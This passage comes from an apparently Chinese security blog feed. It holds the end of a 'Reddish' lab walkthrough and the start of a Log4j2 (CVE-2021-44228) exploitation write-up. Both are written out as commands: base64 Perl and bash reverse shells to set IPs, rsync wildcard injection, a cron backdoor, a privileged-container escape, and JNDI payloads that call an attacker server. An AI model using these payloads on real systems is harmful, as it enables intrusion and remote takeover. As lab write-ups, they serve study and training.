/ &amp;&amp; rm -rf /var/www/html/*</span><br><span class="line">rsync -a rsync://backup:873/src/backup/ /var/www/html/</span><br><span class="line">chown www-data. /var/www/html/f187a0ec71ce99642e4f0afbd441a68b</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到rsync，并且使用了通配符*.rdb</p><p>也可以解释，为什么刚刚我们的木马一直被杀了</p><blockquote><p>rsync介绍：</p><p>sync同步：刷新文件系统缓存，强制将修改过的数据块写入磁盘，并且更新超级快。一般重启系统前执行sync命令</p><p>async：将数据先缓存在缓冲区，再周期性（一般是30s）的去同步到磁盘 。性能好，但是不能保证数据的安全性</p><p>rsync：远程同步，remote synchronous</p></blockquote><p>我们可以在&#x2F;var&#x2F;www&#x2F;html&#x2F;f187a0ec71ce99642e4f0afbd441a68b目录</p><p>创建一个rdb文件，然后等待执行</p><p><img src="/img/reddish/44.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&quot; &gt; /var/www/html/f187a0ec71ce99642e4f0afbd441a68b/shell.rdb</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTcyLjE5LjAuNCI7JHA9Nzc3ODtzb2NrZXQoUyxQRl9JTkVULFNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCJ0Y3AiKSk7aWYoY29ubmVjdChTLHNvY2thZGRyX2luKCRwLGluZXRfYXRvbigkaSkpKSl7b3BlbihTVERJTiwiPiZTIik7b3BlbihTVERPVVQsIj4mUyIpO29wZW4oU1RERVJSLCI+JlMiKTtleGVjKCIvYmluL3NoIC1pIik7fTsn&#x27; |base64 -d  &gt; /var/www/html/f187a0ec71ce99642e4f0afbd441a68b/shell.rdb</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTcyLjE5LjAuNCI7JHA9Nzc5OTtzb2NrZXQoUyxQRl9JTkVULFNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCJ0Y3AiKSk7aWYoY29ubmVjdChTLHNvY2thZGRyX2luKCRwLGluZXRfYXRvbigkaSkpKSl7b3BlbihTVERJTiwiPiZTIik7b3BlbihTVERPVVQsIj4mUyIpO29wZW4oU1RERVJSLCI+JlMiKTtleGVjKCIvYmluL3NoIC1pIik7fTsn&#x27; |base64 -d  &gt; /var/www/html/f187a0ec71ce99642e4f0afbd441a68b/shell.rdb</span><br></pre></td></tr></table></figure><p>还有创建一个文件名为<code>-e sh shell.rdb</code>以执行上面的命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&quot; &gt; /var/www/html/f187a0ec71ce99642e4f0afbd441a68b/&#x27;-e sh shell.rdb&#x27;</span><br></pre></td></tr></table></figure><p><img src="/img/reddish/45.png"></p><p><img src="/img/reddish/46.png"></p><p>入口机监听等待</p><p><img src="/img/reddish/47.png"></p><p>命令执行</p><p>成功反弹shell</p><p><img src="/img/reddish/48.png"></p><p><img src="/img/reddish/49.png"></p><p>总算拿到这台机子172.19.0.3的root了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"># ip a</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">13: eth0@if14: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default </span><br><span class="line">    link/ether 02:42:ac:13:00:03 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.19.0.3/16 brd 172.19.255.255 scope global eth0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">17: eth1@if18: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default </span><br><span class="line">    link/ether 02:42:ac:14:00:03 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.20.0.3/16 brd 172.20.255.255 scope global eth1</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line"># </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># pwd</span><br><span class="line">/var/www/html/f187a0ec71ce99642e4f0afbd441a68b</span><br><span class="line"># cd /home/somaro</span><br><span class="line"># ls</span><br><span class="line">user.txt</span><br><span class="line"># cat user.txt</span><br><span class="line">adc95e247f018b843b627efde89f2cb9</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>继续信息收集</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># for i in `seq 1 255`;do ping -c 1 -W 1 172.20.0.$i |grep &#x27;from&#x27; ;done</span><br><span class="line">64 bytes from 172.20.0.1: icmp_seq=1 ttl=64 time=0.061 ms</span><br><span class="line">64 bytes from 172.20.0.2: icmp_seq=1 ttl=64 time=0.034 ms</span><br><span class="line">64 bytes from 172.20.0.3: icmp_seq=1 ttl=64 time=0.017 ms</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>发现还有一台172.20.0.2</p><p>我们ping 一下backup</p><p>发现就是这台机子</p><p><img src="/img/reddish/50.png"></p><p>我们需要横向到这个台机子上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[Attacker] 10.10.16.38</span><br><span class="line"></span><br><span class="line">  [nodered] 172.18.0.2:1880 172.19.0.4:1880</span><br><span class="line"></span><br><span class="line">    [host] 172.19.0.1</span><br><span class="line"></span><br><span class="line">    [www] 172.19.0.2:80 == website (root)</span><br><span class="line"></span><br><span class="line">      [backup] 172.20.0.3</span><br><span class="line"></span><br><span class="line">    [redis] 172.19.0.3:6379 == database of 172.19.0.2</span><br><span class="line"></span><br><span class="line">    [nodered]     172.19.0.4:1880 (root)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们需要端口转发（前面想偷懒的，现在偷不成了）</p><p><img src="/img/reddish/51.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./ncat -lvnp 5555 &lt; /node-red/ncat</span><br><span class="line">bash -c &quot;cat &lt; /dev/tcp/172.19.0.4/5555 &gt; ncat&quot;</span><br></pre></td></tr></table></figure><p>传工具，端口转发</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./socat TCP-LISTEN:7778,fork TCP:10.10.16.38:777</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./socat TCP-LISTEN:8808,fork TCP:10.10.16.38:8808 &amp;</span><br></pre></td></tr></table></figure><p>将入口机的7779端口转发给攻击机的777</p><p>再安装个pwncat，好上传工具</p><p><font style="color:rgb(52, 52, 60);">选择是使用一个</font><a href="https://unix.stackexchange.com/questions/83926/how-to-download-a-file-using-just-bash-and-nothing-else-no-curl-wget-perl-et"><font style="color:rgb(0, 86, 178);">函数，该函数将使用纯 bash 充当 curl</font></a><font style="color:rgb(52, 52, 60);"> 并将其粘贴到 nodered 容器上。</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function __curl() &#123;</span><br><span class="line">  read -r proto server path &lt;&lt;&lt;&quot;$(printf &#x27;%s&#x27; &quot;$&#123;1//// &#125;&quot;)&quot;</span><br><span class="line">  if [ &quot;$proto&quot; != &quot;http:&quot; ]; then</span><br><span class="line">    printf &gt;&amp;2 &quot;sorry, %s supports only http\n&quot; &quot;$&#123;FUNCNAME[0]&#125;&quot;</span><br><span class="line">    return 1</span><br><span class="line">  fi</span><br><span class="line">  DOC=/$&#123;path// //&#125;</span><br><span class="line">  HOST=$&#123;server//:*&#125;</span><br><span class="line">  PORT=$&#123;server//*:&#125;</span><br><span class="line">  [ &quot;$&#123;HOST&#125;&quot; = &quot;$&#123;PORT&#125;&quot; ] &amp;&amp; PORT=80</span><br><span class="line"></span><br><span class="line">  exec 3&lt;&gt;&quot;/dev/tcp/$&#123;HOST&#125;/$PORT&quot;</span><br><span class="line">  printf &#x27;GET %s HTTP/1.0\r\nHost: %s\r\n\r\n&#x27; &quot;$&#123;DOC&#125;&quot; &quot;$&#123;HOST&#125;&quot; &gt;&amp;3</span><br><span class="line">  (while read -r line; do</span><br><span class="line">   [ &quot;$line&quot; = $&#x27;\r&#x27; ] &amp;&amp; break</span><br><span class="line">  done &amp;&amp; cat) &lt;&amp;3</span><br><span class="line">  exec 3&gt;&amp;-</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将以上函数直接输入终端中</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p><font style="color:rgb(12, 13, 14);">If you have bash 2.04 or above with the</font><font style="color:rgb(12, 13, 14);"> </font><font style="color:rgb(12, 13, 14);">pseudo-device enabled, you can download a file from bash itself.</font><code>&lt;font style=&quot;color:rgb(12, 13, 14);background-color:rgb(227, 230, 232);&quot;&gt;/dev/tcp&lt;/font&gt;</code></p><p><font style="color:rgb(12, 13, 14);">Paste the following code directly into a bash shell (you don’t need to save the code into a file for executing):</font></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">__wget</span></span>() &#123;</span><br><span class="line">    : <span class="variable">$&#123;DEBUG:=0&#125;</span></span><br><span class="line">    <span class="built_in">local</span> URL=<span class="variable">$1</span></span><br><span class="line">    <span class="built_in">local</span> tag=<span class="string">&quot;Connection: close&quot;</span></span><br><span class="line">    <span class="built_in">local</span> mark=0</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$&#123;URL&#125;</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">printf</span> <span class="string">&quot;Usage: %s \&quot;URL\&quot; [e.g.: %s http://www.google.com/]&quot;</span> \</span><br><span class="line">               <span class="string">&quot;<span class="variable">$&#123;FUNCNAME[0]&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;FUNCNAME[0]&#125;</span>&quot;</span></span><br><span class="line">        <span class="built_in">return</span> 1;</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    <span class="built_in">read</span> proto server path &lt;&lt;&lt;$(<span class="built_in">echo</span> <span class="variable">$&#123;URL//// &#125;</span>)</span><br><span class="line">    DOC=/<span class="variable">$&#123;path// //&#125;</span></span><br><span class="line">    HOST=<span class="variable">$&#123;server//:*&#125;</span></span><br><span class="line">    PORT=<span class="variable">$&#123;server//*:&#125;</span></span><br><span class="line">    [[ x<span class="string">&quot;<span class="variable">$&#123;HOST&#125;</span>&quot;</span> == x<span class="string">&quot;<span class="variable">$&#123;PORT&#125;</span>&quot;</span> ]] &amp;&amp; PORT=80</span><br><span class="line">    [[ <span class="variable">$DEBUG</span> -eq 1 ]] &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;HOST=<span class="variable">$HOST</span>&quot;</span></span><br><span class="line">    [[ <span class="variable">$DEBUG</span> -eq 1 ]] &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;PORT=<span class="variable">$PORT</span>&quot;</span></span><br><span class="line">    [[ <span class="variable">$DEBUG</span> -eq 1 ]] &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;DOC =<span class="variable">$DOC</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">exec</span> 3&lt;&gt;/dev/tcp/<span class="variable">$&#123;HOST&#125;</span>/<span class="variable">$PORT</span></span><br><span class="line">    <span class="built_in">echo</span> -en <span class="string">&quot;GET <span class="variable">$&#123;DOC&#125;</span> HTTP/1.1\r\nHost: <span class="variable">$&#123;HOST&#125;</span>\r\n<span class="variable">$&#123;tag&#125;</span>\r\n\r\n&quot;</span> &gt;&amp;3</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">read</span> line; <span class="keyword">do</span></span><br><span class="line">        [[ <span class="variable">$mark</span> -eq 1 ]] &amp;&amp; <span class="built_in">echo</span> <span class="variable">$line</span></span><br><span class="line">        <span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$&#123;line&#125;</span>&quot;</span> =~ <span class="string">&quot;<span class="variable">$&#123;tag&#125;</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">            mark=1</span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">done</span> &lt;&amp;3</span><br><span class="line">    <span class="built_in">exec</span> 3&gt;&amp;-</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font style="color:rgb(12, 13, 14);">Then you can execute it as from the shell as follows:</font></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__wget http://example.iana.org/</span><br></pre></td></tr></table></figure><h3 id="利用Rsync文件写入-定时任务横向移动到backup容器"><a href="#利用Rsync文件写入-定时任务横向移动到backup容器" class="headerlink" title="利用Rsync文件写入 定时任务横向移动到backup容器"></a><font style="color:rgb(255, 232, 139);background-color:rgb(20, 19, 39);">利用Rsync文件写入 定时任务横向移动到backup容器</font></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">./ncat -lvnp 9999</span><br><span class="line"></span><br><span class="line">perl -e &#x27;use Socket;$i=&quot;172.20.0.3&quot;;$p=9999;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br><span class="line"></span><br><span class="line">echo cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTcyLjIwLjAuMyI7JHA9OTk5OTtzb2NrZXQoUyxQRl9JTkVULFNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCJ0Y3AiKSk7aWYoY29ubmVjdChTLHNvY2thZGRyX2luKCRwLGluZXRfYXRvbigkaSkpKSl7b3BlbihTVERJTiwiPiZTIik7b3BlbihTVERPVVQsIj4mUyIpO29wZW4oU1RERVJSLCI+JlMiKTtleGVjKCIvYmluL3NoIC1pIik7fTsn |base64 -d &gt;shell.sh</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># echo cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTcyLjIwLjAuMyI7JHA9OTk5OTtzb2NrZXQoUyxQRl9JTkVULFNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCJ0Y3AiKSk7aWYoY29ubmVjdChTLHNvY2thZGRyX2luKCRwLGluZXRfYXRvbigkaSkpKSl7b3BlbihTVERJTiwiPiZTIik7b3BlbihTVERPVVQsIj4mUyIpO29wZW4oU1RERVJSLCI+JlMiKTtleGVjKCIvYmluL3NoIC1pIik7fTsn |base64 -d &gt;shell.sh</span><br><span class="line"># ls</span><br><span class="line">backdoor.php</span><br><span class="line">ncat</span><br><span class="line">proc.sh</span><br><span class="line">shell.sh</span><br><span class="line"># rsync shell.sh rsync://backup:873/src/tmp/shell.sh</span><br><span class="line"># rsync  rsync://backup:873/src/tmp/shell.sh</span><br><span class="line">-rw-r--r--            219 2025/05/31 18:32:06 shell.sh</span><br><span class="line"># echo &#x27;* * * * * root sh /tmp/shell.sh&#x27; &gt; shell</span><br><span class="line"># ls</span><br><span class="line">backdoor.php</span><br><span class="line">ncat</span><br><span class="line">proc.sh</span><br><span class="line">shell</span><br><span class="line">shell.sh</span><br><span class="line"># rsync -a shell rsync://backup:873/src/etc/cron.d/</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在redis上监听</p><p>成功横向</p><p><img src="/img/reddish/52.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ ./ncat -lvnp 9999</span><br><span class="line">Ncat: Version 6.49BETA1 ( http://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::9999</span><br><span class="line">Ncat: Listening on 0.0.0.0:9999</span><br><span class="line">Ncat: Connection from 172.20.0.2.</span><br><span class="line">Ncat: Connection from 172.20.0.2:57856.</span><br><span class="line">/bin/sh: 0: can&#x27;t access tty; job control turned off</span><br><span class="line"># ip con</span><br><span class="line">Object &quot;con&quot; is unknown, try &quot;ip help&quot;.</span><br><span class="line"># ip a</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">11: eth0@if12: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default </span><br><span class="line">    link/ether 02:42:ac:14:00:02 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.20.0.2/16 brd 172.20.255.255 scope global eth0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line"># </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/img/reddish/53.png"></p><p>接下来我们就尝试docker逃逸</p><p><img src="/img/reddish/53.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"># cat /proc/self/status | grep -qi &quot;0000003fffffffff&quot; &amp;&amp; echo &quot;Is privileged mode&quot; || echo &quot;Not privileged mode&quot;</span><br><span class="line">Is privileged mode</span><br><span class="line"># </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># mkdir /tmp/1</span><br><span class="line"># mount /dev/sda2 /tmp/1</span><br><span class="line"># cd /tmp/1</span><br><span class="line"># ls</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ls</span><br><span class="line"># pwd</span><br><span class="line">/tmp/1/mnt</span><br><span class="line"># cd ../</span><br><span class="line"># ls</span><br><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">home</span><br><span class="line">initrd.img</span><br><span class="line">initrd.img.old</span><br><span class="line">lib</span><br><span class="line">lib64</span><br><span class="line">lost+found</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">snap</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br><span class="line">vmlinuz</span><br><span class="line">vmlinuz.old</span><br><span class="line"># cd root</span><br><span class="line"># ls</span><br><span class="line">root.txt</span><br><span class="line"># cat root.txt</span><br><span class="line">a3712ceefd4036951200ea631616fa94</span><br><span class="line"># </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/img/reddish/55.png"></p><p><img src="/img/reddish/56.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶机渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cve-2021-44228-Log4j2</title>
      <link href="/post/f9f48cab.html"/>
      <url>/post/f9f48cab.html</url>
      
        <content type="html"><![CDATA[<h1 id="cve-2021-44228-Log4j2"><a href="#cve-2021-44228-Log4j2" class="headerlink" title="cve-2021-44228-Log4j2"></a>cve-2021-44228-Log4j2</h1><blockquote><p>利用到的工具</p><ul><li><p>JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</p></li><li><p>JNDIExploit-2.0-SNAPSHOT.jar</p><p>一台vps</p></li></ul></blockquote><h2 id="IwaAp">log4j2</h2><h3 id="Lee0K">cve-2021-44228</h3><h4 id="h1mce">利用</h4>##### 探测是否存在漏洞<p>先获取一个DNS的地址</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#探测是否存在漏洞</span></span><br><span class="line"><span class="variable">$</span>&#123;jndi:ldap://<span class="number">123.7</span>k8ovf.ceye.io&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取版本</span></span><br><span class="line"><span class="variable">$</span>&#123;jndi:ldap://<span class="variable">$</span>&#123;sys:java.version&#125;.<span class="number">7</span>k8ovf.ceye.io&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/cve-2021-44228-Log4j2/1.png"></p><p><img src="/img/cve-2021-44228-Log4j2/2.png"></p><p>dns平台回显</p><p><img src="/img/cve-2021-44228-Log4j2/3.png"></p><p>java版本为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.8.0_312</span><br></pre></td></tr></table></figure><h5 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h5><p>在vps开个监听</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc <span class="literal">-lvnp</span> <span class="number">4444</span></span><br></pre></td></tr></table></figure><p><img src="/img/cve-2021-44228-Log4j2/4.png"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash <span class="literal">-i</span> &gt;&amp; /dev/tcp/<span class="number">47.113</span>.<span class="number">229.136</span>/<span class="number">4444</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="/img/cve-2021-44228-Log4j2/5.png"></p><p>YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMTMuMjI5LjEzNi80NDQ0IDA+JjE&#x3D;</p><p>base64编码一下</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java <span class="literal">-jar</span> JNDI<span class="literal">-Injection-Exploit-1</span>.<span class="number">0</span><span class="literal">-SNAPSHOT-all</span>.jar <span class="literal">-C</span> <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMTMuMjI5LjEzNi80NDQ0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> <span class="literal">-A</span> <span class="string">&quot;47.113.229.136&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/img/cve-2021-44228-Log4j2/6.png"></p><p>由于版本为1.8</p><p>所以选择</p><p>ldap:&#x2F;&#x2F;47.113.229.136:1389&#x2F;hozkka</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span>&#123;jndi:ldap://<span class="number">47.113</span>.<span class="number">229.136</span>:<span class="number">1389</span>/hozkka&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/cve-2021-44228-Log4j2/7.png"></p><p>记得把服务器的安全组规则弄一下</p><p>端口开放一下</p><p><img src="/img/cve-2021-44228-Log4j2/8.png"></p><p>应该能弹shell成功的 但是太卡了</p><p>这里是用的在线靶场</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span>&#123;jndi:ldap://<span class="number">47.113</span>.<span class="number">229.136</span>:<span class="number">1389</span>/TomcatBypass/TomcatEcho&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GET /hello?payload=%<span class="number">24</span>%<span class="number">7</span>b%<span class="number">6</span>a%<span class="number">6</span>e%<span class="number">64</span>%<span class="number">69</span>%<span class="number">3</span>a%<span class="number">6</span>c%<span class="number">64</span>%<span class="number">61</span>%<span class="number">70</span>%<span class="number">3</span>a%<span class="number">2</span>f%<span class="number">2</span>f%<span class="number">34</span>%<span class="number">37</span>%<span class="number">2</span>e%<span class="number">31</span>%<span class="number">31</span>%<span class="number">33</span>%<span class="number">2</span>e%<span class="number">32</span>%<span class="number">32</span>%<span class="number">39</span>%<span class="number">2</span>e%<span class="number">31</span>%<span class="number">33</span>%<span class="number">36</span>%<span class="number">3</span>a%<span class="number">31</span>%<span class="number">33</span>%<span class="number">38</span>%<span class="number">39</span>%<span class="number">2</span>f%<span class="number">54</span>%<span class="number">6</span>f%<span class="number">6</span>d%<span class="number">63</span>%<span class="number">61</span>%<span class="number">74</span>%<span class="number">42</span>%<span class="number">79</span>%<span class="number">70</span>%<span class="number">61</span>%<span class="number">73</span>%<span class="number">73</span>%<span 